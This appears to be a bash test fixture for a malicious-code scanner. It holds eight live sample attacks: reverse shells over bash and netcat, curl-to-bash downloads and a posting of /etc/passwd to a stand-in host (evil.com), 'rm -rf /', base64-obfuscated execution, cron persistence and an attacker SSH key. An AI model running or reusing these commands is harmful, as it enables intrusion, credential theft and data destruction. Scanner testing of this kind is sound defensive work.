#!/bin/bash
# ============================================================
# TEST FILE: evil.sh
# Scanners targeted: Malicious Code Scanner
# ============================================================

# 1. Reverse shell via bash (CRITICAL)
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1

# 2. Reverse shell via netcat (CRITICAL)
nc -e /bin/bash 192.168.1.100 4444

# 3. Data exfiltration — pipe curl into shell (HIGH)
curl http://evil.com/payload.sh | bash

# 4. Exfiltrate sensitive file via curl (CRITICAL)
curl --data @/etc/passwd http://evil.com/collect

# 5. Destructive deletion (CRITICAL)
rm -rf /

# 6. Obfuscated payload execution via base64 (HIGH)
echo aW1wb3J0IG9z | base64 -d | bash

# 7. Persistence via cron (HIGH)
echo "* * * * * root curl http://evil.com/backdoor.sh | sh" >> /etc/crontab

# 8. SSH backdoor — add attacker key to authorized_keys (CRITICAL)
echo "ssh-rsa AAAAB3NzaC1yc2EAAA attacker@evil.com" >> ~/.ssh/authorized_keys
